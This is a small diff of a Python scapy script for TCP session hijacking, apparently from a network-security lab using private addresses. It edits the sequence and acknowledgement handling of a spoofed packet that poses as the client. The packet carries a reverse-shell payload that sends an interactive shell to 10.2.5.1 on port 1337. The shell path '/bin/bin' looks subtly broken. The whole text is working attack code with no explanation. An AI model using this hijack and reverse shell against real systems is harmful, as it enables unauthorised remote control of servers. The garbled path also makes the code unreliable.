@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-
 from scapy.all import *
 
 def sess_hijack(pkt):
@@ -7,8 +5,8 @@ def sess_hijack(pkt):
 
         data = "/bin/bin -i > /dev/tcp/10.2.5.1/1337 0<&1 2>&1\n"
 
-        newseq = pkt[TCP].seq #+ 10
-        newack = pkt[TCP].ack #+ 1
+        newseq = pkt[TCP].seq
+        newack = pkt[TCP].ack
 
         ip = IP(src="10.2.5.2", dst="10.2.5.3")         # spoof packet as client to trick server
 
